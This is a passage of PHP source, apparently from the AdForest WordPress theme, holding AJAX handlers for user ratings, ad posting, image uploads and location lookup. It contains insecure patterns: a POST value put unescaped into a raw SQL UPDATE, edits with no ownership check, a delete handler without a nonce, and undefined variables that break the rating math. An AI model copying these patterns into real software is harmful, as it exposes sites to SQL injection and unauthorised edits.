             if(isset($adforest_theme['sb_rewiew_edit']) && $adforest_theme['sb_rewiew_edit']){

            update_user_meta($author, "_user_" . $rator, $ratting . "_separator_" . $comments . "_separator_" . date('Y-m-d'));

            $ratings = adforest_get_all_ratings($author);
            $all_rattings = 0;
            $got = 0;
            if (count($ratings) > 0) {
                foreach ($ratings as $rating) {
                    $data = explode('_separator_', $rating->meta_value);
                    $got = $got + $data[0];
                    $all_rattings++;
                }
                $avg = $got / $all_rattings;
            } else {
                $avg = $ratting;
            }

            
            update_user_meta($author, "_adforest_rating_avg", $avg);
            echo '1|' . __("Your rating has been updated.", 'adforest');
            die();
        }
            echo '0|' . __("You already rated this user.", 'adforest');
        }
        die();
    }

}


// User rating delete
add_action('wp_ajax_sb_delete_user_rating_frontend', 'adforest_sb_rating_delete');

if (!function_exists('adforest_sb_rating_delete')) {
    function adforest_sb_rating_delete () {
     
     $author_id =  $_POST['user_id'];
     $rator  = get_current_user_id();
     $meta_key = "_user_" . $rator;
     $rating  =  get_user_meta($author_id, $meta_key ,true);
    
            
      if ( $rating != "" || is_super_admin($rator)) {
            delete_user_meta($author_id, $meta_key);
            $ratings = adforest_get_all_ratings($author);
            $all_rattings = 0;
            $got = 0;
            if (count($ratings) > 0) {
                foreach ($ratings as $rating) {
                    $data = explode('_separator_', $rating->meta_value);
                    $got = $got + $data[0];
                    $all_rattings++;
                }
                $avg = $got / $all_rattings;
            } else {
                $avg = $ratting;
            }
            update_user_meta($author, "_adforest_rating_avg", $avg);    
           echo '1|' . __("rating deleted  Successfully", 'adforest');
            die();
        } else {
            echo '0|' . __("You can not delete this", 'adforest');
            die();
        }
    
  }
}

// Reply Rator
add_action('wp_ajax_sb_reply_user_rating', 'adforest_reply_rator');
add_action('wp_ajax_nopriv_sb_reply_user_rating', 'adforest_reply_rator');
if (!function_exists('adforest_reply_rator')) {

    function adforest_reply_rator() {

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }
        adforest_authenticate_check();
        check_ajax_referer('sb_user_rate_reply_secure', 'security');
        $params = array();
        parse_str($_POST['sb_data'], $params);
        $comments = $params['sb_rate_user_comments'];
        $rator = $params['rator_reply'];
        $got_ratting = get_current_user_id();

        $ratting = get_user_meta($got_ratting, "_user_" . $rator, true);
        $data_arr = explode('_separator_', $ratting);
        if (count($data_arr) > 3) {
            echo '0|' . __("You already replied to this user.", 'adforest');
        } else {
            $ratting = $ratting . "_separator_" . $comments . "_separator_" . date('Y-m-d');
            update_user_meta($got_ratting, '_user_' . $rator, $ratting);
            echo '1|' . __("Your reply has been posted.", 'adforest');
        }
        die();
    }

}
if (!function_exists('adforest_user_not_logged_in')) {

    function adforest_user_not_logged_in() {
        global $adforest_theme;
        if (get_current_user_id() == 0) {
            $redirect_url = adforest_login_with_redirect_url_param(adforest_get_current_url());
            echo adforest_redirect($redirect_url);
            exit;
        }
    }

}
// check permission for ad posting
if (!function_exists('adforest_check_validity')) {

    function adforest_check_validity() {
        global $adforest_theme;
        $uid = get_current_user_id();
        $sb_packages_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_packages_page']);
        if (get_user_meta($uid, '_sb_simple_ads', true) == 0 || get_user_meta($uid, '_sb_simple_ads', true) == "") {
            adforest_redirect_with_msg(get_the_permalink($sb_packages_page), __('Please subscribe to a package to post an ad.', 'adforest'));
            exit;
        } else {

            if (get_user_meta($uid, '_sb_expire_ads', true) != '-1') {
                if (get_user_meta($uid, '_sb_expire_ads', true) < date('Y-m-d')) {
                    update_user_meta($uid, '_sb_simple_ads', 0);
                    update_user_meta($uid, '_sb_featured_ads', 0);
                    adforest_redirect_with_msg(get_the_permalink($sb_packages_page), __("Your package has been expired.", 'adforest'));
                    exit;
                }
            }
        }
    }

}

// Ad Posting...
add_action('wp_ajax_sb_ad_posting', 'adforest_ad_posting');
if (!function_exists('adforest_ad_posting')) {

    function adforest_ad_posting() {

        global $adforest_theme;

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo "2";
            die();
        }

        check_ajax_referer('sb_post_secure', 'security');
        adforest_set_date_timezone();
        if (get_current_user_id() == "") {
            echo "0";
            die();  
        }
   
           $pay_per_post_check = isset($adforest_theme['sb_pay_per_post_option']) ? $adforest_theme['sb_pay_per_post_option'] : false;

            if (!is_super_admin(get_current_user_id()) && $_POST['is_update'] == "") {
                  
            if(!$pay_per_post_check) {
               
                $simple_ads = get_user_meta(get_current_user_id(), '_sb_simple_ads', true);
                $expiry = get_user_meta(get_current_user_id(), '_sb_expire_ads', true);
                if ($simple_ads == -1) {
                    
                } else if ($simple_ads <= 0) {
                    echo "1";
                    die();
                }

                if ($expiry != '-1') {
                    if ($expiry < date('Y-m-d')) {
                        echo "1";
                        die();
                    }
                }

            }
        
   
            }
  

        // Getting values
        $params = array();
        parse_str($_POST['sb_data'], $params);
        $cats = array();
        if (isset($params['ad_cat_sub_sub_sub']) && $params['ad_cat_sub_sub_sub'] != "") {
            $cats[] = $params['ad_cat_sub_sub_sub'];
        }
        if (isset($params['ad_cat_sub_sub']) && $params['ad_cat_sub_sub'] != "") {
            $cats[] = $params['ad_cat_sub_sub'];
        }
        if (isset($params['ad_cat_sub']) && $params['ad_cat_sub'] != "") {
            $cats[] = $params['ad_cat_sub'];
        }
        if (isset($params['ad_cat']) && $params['ad_cat'] != "") {
            $cats[] = $params['ad_cat'];
        }

        $selecte_cate = $params['ad_cat'];
        $product_ids = get_product_ids_by_meta_query($selecte_cate);
        /* add email adress if it is provided otp register or social login register */

        if (isset($params['sb_user_email']) && $params['sb_user_email'] != "") {
            $user_provided_email = $params['sb_user_email'];
            $user_data = wp_update_user(array('ID' => get_current_user_id(), 'user_email' => $user_provided_email));
        }


        $sb_default_img_required = isset($adforest_theme['sb_default_img_required']) ? $adforest_theme['sb_default_img_required'] : false; // get image req or not in default template ad post

        $sb_form_is_custom = isset($params['sb_form_is_custom']) && $params['sb_form_is_custom'] == 'no' ? true : FALSE; // get ad post template type
        $ad_status = 'publish';
        if(isset($pay_per_post_check) && !empty($product_ids)){
        $ad_status = 'pending';
        }
        
        if ($_POST['is_update'] != "") {
            $pid = $_POST['is_update'];
            if ($adforest_theme['sb_update_approval'] == 'manual') {
                $ad_status = 'pending';
            } else if (get_post_status($pid) == 'pending' || get_post_status($pid) == 'rejected') {
                $ad_status = 'pending';
            }

            $stored_ad_status = get_post_meta($pid, '_adforest_ad_status_', true);

            if (get_post_status($pid) == 'draft' || $stored_ad_status == 'sold' || $stored_ad_status == 'expired') {
                $ad_status = 'draft';
            }

            if (!$sb_form_is_custom) {
                $is_imageallow = adforestCustomFieldsVals($pid, $cats);
            }
            $media = get_attached_media('image', $pid);
           
            if ($sb_default_img_required && $sb_form_is_custom) {
                $is_imageallow = 1;
            }

            if ($is_imageallow == 1 && count($media) == 0) {
                echo "img_req";
                wp_die();
            }

            if ($ad_status == 'pending') {

                adforest_get_notify_on_ad_post($pid, true);
            }
            
        } else {

            if ($adforest_theme['sb_ad_approval'] == 'manual') {
                $ad_status = 'pending';
            }
            $pid = get_user_meta(get_current_user_id(), 'ad_in_progress', true);

            $is_imageallow = false;
            if (!$sb_form_is_custom) {
                $is_imageallow = adforestCustomFieldsVals($pid, $cats);
            }
            $media = get_attached_media('image', $pid);
            if ($sb_default_img_required && $sb_form_is_custom) {
                $is_imageallow = 1;
            }
            if ($is_imageallow == 1 && count($media) == 0) {
                echo "img_req";
                wp_die();
            }

            // Now user can post new ad
            delete_user_meta(get_current_user_id(), 'ad_in_progress');

            $pay_per_post_check = isset($adforest_theme['sb_pay_per_post_option']) ? $adforest_theme['sb_pay_per_post_option'] : false;
           
            if(isset($pay_per_post_check) && !empty($product_ids)) {
          
           $simple_ads = get_user_meta(get_current_user_id(), '_sb_simple_ads', true);
            if ($simple_ads > 0 && !is_super_admin(get_current_user_id())) {
                $simple_ads = $simple_ads - 1;
                update_user_meta(get_current_user_id(), '_sb_simple_ads', $simple_ads);
              }
           

            $_sb_allow_bidding = get_user_meta(get_current_user_id(), '_sb_allow_bidding', true);
            if (isset($_sb_allow_bidding) && $_sb_allow_bidding > 0 && !is_super_admin(get_current_user_id()) && $params['ad_bidding'] == 1) {
                $_sb_allow_bidding = $_sb_allow_bidding - 1;
                update_user_meta(get_current_user_id(), '_sb_allow_bidding', $_sb_allow_bidding);
            }

         
         
           }
            update_post_meta($pid, '_adforest_ad_status_', 'active');
            update_post_meta($pid, '_adforest_is_feature', '0');
            adforest_get_notify_on_ad_post($pid);
        }


        global $wpdb;
        $qry = "UPDATE $wpdb->postmeta SET meta_value = '' WHERE post_id = '$pid' AND meta_key LIKE '_adforest_tpl_field_%'";
        $wpdb->query($qry);
        /* Bad words filteration */
        $words = explode(',', $adforest_theme['bad_words_filter']);
        $replace = $adforest_theme['bad_words_replace'];
        $desc = adforest_badwords_filter($words, $params['ad_description'], $replace);
        $title = adforest_badwords_filter($words, $params['ad_title'], $replace);
        //$desc = preg_replace('/(<[^>]+) style=".*?"/i', '$1', $desc);
       
        $desc = wp_kses_post($desc);
        $desc = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $desc);
 
        $desc = preg_replace('/<img[^>]*>/', '', $desc);



        $sb_trusted_user = get_user_meta(get_current_user_id(), '_sb_trusted_user', true);
        $ad_status = ($sb_trusted_user == 1 ) ? 'publish' : $ad_status;

        if ($_POST['is_update'] != "") {

            $my_post = array(
                'ID' => $pid,
                'post_title' => sanitize_text_field($title),
                'post_status' => $ad_status,
                'post_content' => $desc,
                'post_name' => sanitize_text_field($title),
                'post_type' => 'ad_post'
            );
        } else {
            $my_post = array(
                'ID' => $pid,
                'post_title' => sanitize_text_field($title),
                'post_status' => $ad_status,
                'post_content' => $desc,
                'post_name' => sanitize_text_field($title),
                'post_date' => current_time('mysql'),
                'post_type' => 'ad_post',
                    /* 'post_date' => date('Y-m-d H:i:s'),
                      'post_date_gmt' => get_gmt_from_date(current_time('mysql'))
                      'post_date_gmt' => get_gmt_from_date(date('Y-m-d H:i:s')) */
            );
        }

        wp_update_post($my_post);
        $category = array();
        if (isset($params['ad_cat']) && $params['ad_cat'] != "") {
            $category[] = $params['ad_cat'];
        }
        if (isset($params['ad_cat_sub']) && $params['ad_cat_sub'] != "") {
            $category[] = $params['ad_cat_sub'];
        }
        if (isset($params['ad_cat_sub_sub']) && $params['ad_cat_sub_sub'] != "") {
            $category[] = $params['ad_cat_sub_sub'];
        }
        if (isset($params['ad_cat_sub_sub_sub']) && $params['ad_cat_sub_sub_sub'] != "") {
            $category[] = $params['ad_cat_sub_sub_sub'];
        }

        wp_set_post_terms($pid, $category, 'ad_cats');

        /* countries */
        $countries = array();
        if (isset($params['ad_country']) && $params['ad_country'] != "") {
            $countries[] = $params['ad_country'];
        }
        if (isset($params['ad_country_states']) && $params['ad_country_states'] != "") {
            $countries[] = $params['ad_country_states'];
        }
        if (isset($params['ad_country_cities']) && $params['ad_country_cities'] != "") {
            $countries[] = $params['ad_country_cities'];
        }
        if (isset($params['ad_country_towns']) && $params['ad_country_towns'] != "") {
            $countries[] = $params['ad_country_towns'];
        }

        wp_set_post_terms($pid, $countries, 'ad_country');

        // setting taxonomoies selected
        $type = '';
        if (isset($params['buy_sell']) && $params['buy_sell'] != "") {
            $type_arr = explode('|', $params['buy_sell']);
            wp_set_post_terms($pid, $type_arr[0], 'ad_type');
            $type = $type_arr[1];
        }
        $conditon = '';
        if (isset($params['condition']) && $params['condition'] != "") {
            $condition_arr = explode('|', $params['condition']);
            wp_set_post_terms($pid, $condition_arr[0], 'ad_condition');
            $conditon = $condition_arr[1];
        }
        $warranty = '';
        if (isset($params['ad_warranty']) && $params['ad_warranty'] != "") {
            $warranty_arr = explode('|', $params['ad_warranty']);
            wp_set_post_terms($pid, $warranty_arr[0], 'ad_warranty');
            $warranty = $warranty_arr[1];
        }

        $currency = '';
        if (isset($params['ad_currency']) && $params['ad_currency'] != "") {
            $currency_arr = explode('|', $params['ad_currency']);
            wp_set_post_terms($pid, $currency_arr[0], 'ad_currency');
            $currency = $currency_arr[1];
            update_post_meta($pid, '_adforest_ad_currency', sanitize_text_field($currency));
        }

        $tags = explode(',', $params['tags']);
        wp_set_object_terms($pid, $tags, 'ad_tags');

        // Update post meta
        $theme_ad_bidding_date = ( isset($params['ad_bidding']) && $params['ad_bidding'] == 1 ) ? $params['ad_bidding_date'] : '';

        $sb_user_name = isset($params['sb_user_name']) && $params['sb_user_name'] != '' ? $params['sb_user_name'] : '';

        $sb_contact_number = isset($params['sb_contact_number']) && $params['sb_contact_number'] != '' ? $params['sb_contact_number'] : '';

        $sb_user_address = isset($params['sb_user_address']) && $params['sb_user_address'] != '' ? $params['sb_user_address'] : '';

        $ad_price = isset($params['ad_price']) && $params['ad_price'] != '' ? $params['ad_price'] : '';
        $ad_map_lat = isset($params['ad_map_lat']) && $params['ad_map_lat'] != '' ? $params['ad_map_lat'] : '';

        $ad_map_long = isset($params['ad_map_long']) && $params['ad_map_long'] != '' ? $params['ad_map_long'] : '';

        $ad_bidding = isset($params['ad_bidding']) && $params['ad_bidding'] != '' ? $params['ad_bidding'] : '';

        $ad_price_type = isset($params['ad_price_type']) && $params['ad_price_type'] != '' ? $params['ad_price_type'] : '';

        update_post_meta($pid, '_adforest_poster_name', sanitize_text_field($sb_user_name));
        update_post_meta($pid, '_adforest_poster_contact', sanitize_text_field($sb_contact_number));
        update_post_meta($pid, '_adforest_ad_location', sanitize_text_field($sb_user_address));
        update_post_meta($pid, '_adforest_ad_type', sanitize_text_field($type));
        update_post_meta($pid, '_adforest_ad_condition', sanitize_text_field($conditon));
        update_post_meta($pid, '_adforest_ad_warranty', sanitize_text_field($warranty));
        update_post_meta($pid, '_adforest_ad_price', sanitize_text_field($ad_price));
        update_post_meta($pid, '_adforest_ad_map_lat', sanitize_text_field($ad_map_lat));
        update_post_meta($pid, '_adforest_ad_map_long', sanitize_text_field($ad_map_long));
        update_post_meta($pid, '_adforest_ad_bidding', sanitize_text_field($ad_bidding));
        update_post_meta($pid, '_adforest_ad_price_type', sanitize_text_field($ad_price_type));
        update_post_meta($pid, '_adforest_ad_bidding_date', sanitize_text_field($theme_ad_bidding_date));
        if (isset($params['ad_yvideo']) && $params['ad_yvideo'] != "") {
            update_post_meta($pid, '_adforest_ad_yvideo', sanitize_text_field($params['ad_yvideo']));
        } else {
            update_post_meta($pid, '_adforest_ad_yvideo', '');
        }

        // Making it featured ad
        if (isset($params['sb_make_it_feature']) && $params['sb_make_it_feature']) {
            // Uptaing remaining ads.
            $featured_ad = get_user_meta(get_current_user_id(), '_sb_featured_ads', true);
            if ($featured_ad > 0 || $featured_ad == '-1') {
                update_post_meta($pid, '_adforest_is_feature', '1');
                update_post_meta($pid, '_adforest_is_feature_date', date('Y-m-d'));

                $old_featured_count = $featured_ad;
                $new_featured_count = '';
                if ($old_featured_count == '-1') {
                    $new_featured_count = '-1';
                } elseif ($old_featured_count > 0) {
                    $new_featured_count = $old_featured_count - 1;
                }
                update_user_meta(get_current_user_id(), '_sb_featured_ads', $new_featured_count);
                $package_adFeatured_expiry_days = get_user_meta(get_current_user_id(), 'package_adFeatured_expiry_days', true);
                if ($package_adFeatured_expiry_days) {
                    update_post_meta($pid, 'package_adFeatured_expiry_days', $package_adFeatured_expiry_days);
                }
            }
        }

        // Bumping it up
        if (isset($params['sb_bump_up']) && $params['sb_bump_up']) {
            // Uptaing remaining ads.
            $bump_ads = get_user_meta(get_current_user_id(), '_sb_bump_ads', true);
            if ($bump_ads > 0 || $bump_ads == '-1' || ( isset($adforest_theme['sb_allow_free_bump_up']) && $adforest_theme['sb_allow_free_bump_up'] )) {
                wp_update_post(
                        array(
                            'ID' => $pid, // ID of the post to update
                            'post_date' => current_time('mysql'),
                            'post_type' => 'ad_post',
                            'post_author' => get_current_user_id(),
                        //'post_date' => date('Y-m-d H:i:s'),
                        // 'post_date_gmt' => get_gmt_from_date(current_time('mysql'))
                        // 'post_date_gmt' => get_gmt_from_date(date('Y-m-d H:i:s'))
                        )
                );
                do_action('adforest_wpml_bumpup_ads', $pid);
                if (!$adforest_theme['sb_allow_free_bump_up'] && $bump_ads != '-1') {
                    $bump_ads = $bump_ads - 1;
                    update_user_meta(get_current_user_id(), '_sb_bump_ads', $bump_ads);
                }
            }
        }

        // Stroring Extra fileds in DB
        if (isset($params['sb_total_extra']) && $params['sb_total_extra'] > 0) {
            for ($i = 1; $i <= $params['sb_total_extra']; $i++) {
                update_post_meta($pid, "_sb_extra_" . $params["title_$i"], sanitize_text_field($params["sb_extra_$i"]));
            }
        }
        //Add Dynamic Fields
        if (isset($params['cat_template_field']) && count($params['cat_template_field']) > 0) {
            foreach ($params['cat_template_field'] as $key => $data) {
                if (is_array($data)) {
                    $dataArr = array();
                    foreach ($data as $k)
                        $dataArr[] = $k;
                    $data = stripslashes(json_encode($dataArr, JSON_UNESCAPED_UNICODE));
                }
                update_post_meta($pid, $key, sanitize_text_field($data));
            }
        }
        /* Making Location DB
          explode address */
        if ($params['ad_map_lat'] == "" && $params['ad_map_long']) {
            $address = explode(',', $params['sb_user_address']);
            if (count($address) == 3) {
                $city = trim($address[0]);
                $state = trim($address[1]);
                $country = trim($address[2]);
                adforest_add_location($country, $state, $city);
            } else if (count($address) == 2) {
                $city = trim($address[0]);
                $country = trim($address[1]);
                $state = '';
                adforest_add_location($country, $state, $city);
            }
        }
        do_action('adforest_directory_fields_saving', $pid, $params); /* save directory data */
        if ($_POST['is_update'] == "") {
       $pay_per_post_check = $adforest_theme['sb_pay_per_post_option'];
       if(isset($pay_per_post_check) && !empty($product_ids)){
            $package_ad_expiry_days = get_user_meta(get_current_user_id(), 'package_ad_expiry_days', true);
            if ($package_ad_expiry_days) {
                update_post_meta($pid, 'package_ad_expiry_days', $package_ad_expiry_days);
            }
            do_action('adforest_duplicate_posts_lang', $pid);
        }
        }
        /**
         * 0 = N/A
         * 1 = open 24/7
         * 2 = selective hours
         */
        $listing_is_open = isset($params['hours_type']) ? ($params['hours_type']) : "";
        $listing_timezone = isset($params['listing_timezome']) ? ($params['listing_timezome']) : "";
        $listing_brandname = isset($params['listing_brandname']) ? ($params['listing_brandname']) : "";
        /* checkbox for closed/not */
        $is_closed = isset($params['is_closed']) ? $params['is_closed'] : array();
        $start_from = isset($params['to']) ? $params['to'] : array();
        $end_from = isset($params['from']) ? $params['from'] : array();
        //get break hours data again input name
        $break_from = isset($params['breakfrom']) ? $params['breakfrom'] : array();
        $break_to = isset($params['breakto']) ? $params['breakto'] : array();
        $break_click = isset($params['is_break']) ? $params['is_break'] : array();

        if ($listing_is_open == '1') {
            update_post_meta($pid, 'sb_pro_is_hours_allow', '1');
            update_post_meta($pid, 'sb_pro_business_hours', $listing_is_open);
        } /* listing business hours */ else if ($listing_is_open == '2') {
            /* business hours */
            $custom_days = array('Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday');
            for ($a = 0; $a <= 6; $a++) {
                $to = '';
                $from = '';
                $days = '';
                $break_time_from = '';
                $break_time_to = '';
                //get days
                $days = lcfirst($custom_days[$a]);
                if (!in_array($a, $is_closed)) {
                    $from = date("H:i:s", strtotime(str_replace(" : ", ":", $end_from[$a])));
                    $to = date("H:i:s", strtotime(str_replace(" : ", ":", $start_from[$a])));
                    //day status open or not
                    update_post_meta($pid, '_timingz_' . $days . '_open', '1');
                    //day hours from
                    update_post_meta($pid, '_timingz_' . $days . '_from', $from);
                    update_post_meta($pid, '_timingz_' . $days . '_to', $to);
                    //break hours
                    if (in_array($a, $break_click)) {
                        $break_time_from = isset($break_from[$a]) && $break_from[$a] != "" ? date("H:i:s", strtotime(str_replace(" : ", ":", $break_from[$a]))) : "";
                        $break_time_to = isset($break_to[$a]) && $break_to[$a] != "" ? date("H:i:s", strtotime(str_replace(" : ", ":", $break_to[$a]))) : "";

                        update_post_meta($pid, '_timingz_break_' . $days . '_open', '1');
                        update_post_meta($pid, '_timingz_break_' . $days . '_breakfrom', $break_time_from);
                        update_post_meta($pid, '_timingz_break_' . $days . '_breakto', $break_time_to);
                    } else {
                        update_post_meta($pid, '_timingz_break_' . $days . '_open', '0');
                        update_post_meta($pid, '_timingz_break_' . $days . '_breakfrom', '');
                        update_post_meta($pid, '_timingz_break_' . $days . '_breakto', '');
                    }
                } else {
                    update_post_meta($pid, '_timingz_' . $days . '_open', '0');
                }
            }
            update_post_meta($pid, 'sb_pro_business_hours', 0);
            update_post_meta($pid, 'sb_pro_user_timezone', $listing_timezone);
            update_post_meta($pid, 'sb_pro_is_hours_allow', '1');
        } else {
            update_post_meta($pid, 'sb_pro_is_hours_allow', '0');
            /* add this code on 26-aug-2020(because n/a not show if user choose N/A) */
            update_post_meta($pid, 'sb_pro_business_hours', '');
        }



        if ($_POST['is_update'] != "") {
            $my_post = array(
                'ID' => $pid,
                'post_title' => sanitize_text_field($title),
                'post_status' => $ad_status,
                'post_content' => $desc,
                'post_name' => sanitize_text_field($title),
                'post_type' => 'ad_post'
            );
            wp_update_post($my_post);
        }
     
        $selecte_cate = $params['ad_cat'];
        $product_ids = get_product_ids_by_meta_query($selecte_cate);
 
        if(isset($adforest_theme['make_feature_paid']) && $adforest_theme['make_feature_paid'] &&  get_post_meta($pid, '_adforest_is_feature', true)  != "1" ){
           $url = get_the_permalink($adforest_theme['sb_feature_template_page']);
           $redirect_url = $url."?pid=".$pid;
        } 
        elseif (isset($adforest_theme['make_bump_up_paid']) && $adforest_theme['make_bump_up_paid'] &&  get_post_meta($pid, '_sb_bump_ads', true)  != "1" && $_POST['is_update'] != ""){

             $url = get_the_permalink($adforest_theme['sb_bump_up_template_page']);
             $redirect_url = $url."?pid=".$pid;;
         }        
         elseif (isset($adforest_theme['sb_pay_per_post_option']) && $adforest_theme['sb_pay_per_post_option'] == 1  && !empty($product_ids))
         {
                $selecte_cate = $params['ad_cat'];
                $args = array(
                    'tax_query' => array(
                        array(
                            'taxonomy' => 'product_type',
                            'field' => 'slug',
                            'terms' => array('adforest_pay_per_post_pkgs'),
                        ),
                    ),
                    'meta_query' => array(
                        array(
                            'key' => 'adforest_package_cats',
                            'value' => sprintf(':"%s";', $selecte_cate),
                            'compare' => 'LIKE',
                        ),
                    ),
                    'relation' => 'AND',
                    'post_type' => 'product',
                    'post_status' => 'publish',
                    'posts_per_page' => -1,
                    'order' => 'DESC',
                    'orderby' => 'ID',
                );
                $query = new WP_Query($args);
                if ($query->have_posts()) {
                while ($query->have_posts()) {
                    $query->the_post();
                    $package_id = get_the_ID();
                }
                wp_reset_postdata();
                }
               $post_id = $pid;
            if (class_exists('WooCommerce')) {
              global $woocommerce;
                $woocommerce->cart->add_to_cart($package_id);
                WC()->session->set('sb_pay_per_post_id', $post_id); 
                WC()->session->set('sb_pay_per_package_cat_id', $package_id);
                if (function_exists('wc_get_cart_url')) {
                    $redirect_url = wc_get_cart_url();
                }
            }
        }
        else
        {
            $redirect_url = get_the_permalink($pid); 
        }
        echo ($redirect_url);
        die();
    }
 
}


if (!function_exists('adforestCustomFieldsVals')) {

    function adforestCustomFieldsVals($post_id = '', $terms = array()) {
        if ($post_id == "")
            return;
        /* $terms = wp_get_post_terms($post_id, 'ad_cats'); */
        $is_show = '';
        if (count($terms) > 0) {

            foreach ($terms as $term) {
                $term_id = $term;
                $t = adforest_dynamic_templateID($term_id);
                if ($t)
                    break;
            }
            $templateID = adforest_dynamic_templateID($term_id);
            $result = get_term_meta($templateID, '_sb_dynamic_form_fields', true);

            $is_show = '';
            $html = '';

            if (isset($result) && $result != "") {
                $is_show = sb_custom_form_data($result, '_sb_default_cat_image_required');
            }
        }
        return ($is_show == 1) ? 1 : 0;
    }

}

add_action('wp_ajax_upload_ad_images', 'adforest_upload_ad_images');
if (!function_exists('adforest_upload_ad_images')) {

    function adforest_upload_ad_images() {

        global $adforest_theme;

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo '0|' . __("Not allowed in demo mode", 'adforest');
            die();
        }

        adforest_authenticate_check();

        require_once ABSPATH . 'wp-admin/includes/image.php';
        require_once ABSPATH . 'wp-admin/includes/file.php';
        require_once ABSPATH . 'wp-admin/includes/media.php';

        if (isset($adforest_theme['sb_standard_images_size']) && $adforest_theme['sb_standard_images_size']) {
            list($width, $height) = getimagesize($_FILES["my_file_upload"]["tmp_name"]);
            if ($width < 760) {
                echo '0|' . __("Minimum image dimension should be", 'adforest') . ' 760x410';
                die();
            }

            if ($height < 410) {
                echo '0|' . __("Minimum image dimension should be", 'adforest') . ' 760x410';
                die();
            }
        }


        $size_arr = explode('-', $adforest_theme['sb_upload_size']);
        $display_size = $size_arr[1];
        $actual_size = $size_arr[0];

        $data_files = explode('.', $_FILES['my_file_upload']['name']);
        // Allow certain file formats
        $imageFileType = strtolower(end($data_files));
        if ($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg" && $imageFileType != "gif") {
            echo '0|' . __("Sorry, only JPG, JPEG, PNG & GIF files are allowed.", 'adforest');
            die();
        }

        // Check file size
        if ($_FILES['my_file_upload']['size'] > $actual_size) {
            echo '0|' . __("Max allowed image size is", 'adforest') . " " . $display_size;
            die();
        }

        // Let WordPress handle the upload.
        // Remember, 'my_image_upload' is the name of our file input in our form above.
        if ($_GET['is_update'] != "") {
            $ad_id = $_GET['is_update'];
        } else {
            $ad_id = get_user_meta(get_current_user_id(), 'ad_in_progress', true);
        }

        if ($ad_id == "") {
            echo '0|' . __("Please enter title first in order to create ad.", 'adforest');
            die();
        }
        $user_packages_images = get_user_meta(get_current_user_id(), '_sb_num_of_images', true);

        $user_upload_max_images = '';
        if (isset($user_packages_images) && $user_packages_images == '-1') {
            $user_upload_max_images = '';
        } elseif (isset($user_packages_images) && $user_packages_images > 0) {
            $user_upload_max_images = $user_packages_images;
        } else {
            $user_upload_max_images = $adforest_theme['sb_upload_limit'];
        }

        $media = get_attached_media('image', $ad_id);

        if ($user_upload_max_images != '') {
            if (count($media) >= $user_upload_max_images) {
                echo '0|' . __("You can not upload more than ", 'adforest') . " " . $user_upload_max_images;
                die();
            }
        }
        $attachment_id = media_handle_upload('my_file_upload', $ad_id);
        if (is_wp_error($attachment_id)) {
            $error_string = $attachment_id->get_error_message();
            echo '0|' . $error_string;
            die();
        }
        $imgaes = get_post_meta($ad_id, '_sb_photo_arrangement_', true);
        if ($imgaes != "") {
            $imgaes = $imgaes . ',' . $attachment_id;
            update_post_meta($ad_id, '_sb_photo_arrangement_', $imgaes);
        } else {
            update_post_meta($ad_id, '_sb_photo_arrangement_', $attachment_id);
        }
        echo adforest_returnEcho($attachment_id);
        die();
    }

}



add_action('wp_ajax_post_ad', 'adforest_post_ad_process');
if (!function_exists('adforest_post_ad_process')) {

    function adforest_post_ad_process() {

        $is_demo = adforest_is_demo();
        if ($is_demo) {
            echo esc_html__("Not allowed in demo mode", 'adforest');
            die();
        }


        if ($_POST['is_update'] != "") {
            wp_die();
        }
        $title = sanitize_text_field($_POST['title']);
        if (get_current_user_id() == "") {
            wp_die();
        }
        if (!isset($title)) {
            wp_die();
        }
        $ad_id = get_user_meta(get_current_user_id(), 'ad_in_progress', true);
        if (get_post_status($ad_id) && $ad_id != "" && get_post_status($ad_id) != 'publish') {
            $my_post = array(
                'ID' => get_user_meta(get_current_user_id(), 'ad_in_progress', true),
                'post_title' => $title,
                'post_status' => 'private',
                'post_type' => 'ad_post',
                'post_author' => get_current_user_id(),
            );
            wp_update_post($my_post);
            wp_die();
        }
        // Gather post data.
        $my_post = array(
            'post_title' => sanitize_text_field($title),
            'post_status' => 'private',
            'post_author' => get_current_user_id(),
            'post_type' => 'ad_post'
        );
        // Insert the post into the database.
        $id = wp_insert_post($my_post);
        if ($id) {
            update_user_meta(get_current_user_id(), 'ad_in_progress', $id);
        }
        wp_die();
    }

}


add_action('wp_ajax_nopriv_fetch_suggestions', 'adforest_listing_live_search');
add_action('wp_ajax_fetch_suggestions', 'adforest_listing_live_search');
if (!function_exists('adforest_listing_live_search')) {

    function adforest_listing_live_search() {


        $return = array();
        $args = array(
            's' => isset($_GET['query']) && !empty($_GET['query']) ? $_GET['query'] : '',
            'post_type' => 'ad_post',
            'post_status' => 'publish',
            'ignore_sticky_posts' => 1,
            'posts_per_page' => 25
        );

        $args = apply_filters('adforest_wpml_show_all_posts', $args);
        $args = apply_filters('adforest_site_location_ads', $args, 'ads');
        $search_results = new WP_Query($args);
        if ($search_results->have_posts()) :
            while ($search_results->have_posts()) : $search_results->the_post();
                // shorten the title a little
                $title = $search_results->post->post_title;
                $return[] = adforest_clean_strings($title);
            endwhile;
            wp_reset_postdata();
        endif;
        echo json_encode($return);
        die;
    }

}

/* Get States */
add_action('wp_ajax_sb_get_sub_states', 'adforest_get_sub_states');
add_action('wp_ajax_nopriv_sb_get_sub_states_search', 'adforest_get_sub_states_search');
if (!function_exists('adforest_get_sub_states')) {

    function adforest_get_sub_states() {
        $country_id = $_POST['country_id'];
        $ad_country = adforest_get_cats('ad_country', $country_id, 0, 'post_ad');
        if (count($ad_country) > 0) {
            $cats_html = '<select class="category form-control">';
            $cats_html .= '<option label="' . esc_html__('Select Option', 'adforest') . '"></option>';
            foreach ($ad_country as $ad_cat) {
                $cats_html .= '<option value="' . $ad_cat->term_id . '">' . $ad_cat->name . '</option>';
            }
            $cats_html .= '</select>';
            echo adforest_returnEcho($cats_html);
            die();
        } else {
            echo "";
            die();
        }
    }

}

/* Get States Search */
add_action('wp_ajax_get_related_cities', 'adforest_get_countries');
add_action('wp_ajax_nopriv_get_related_cities', 'adforest_get_countries');
if (!function_exists('adforest_get_countries')) {

    function adforest_get_countries() {
        global $adforest_theme;

        $cat_id = $_POST['country_id'];
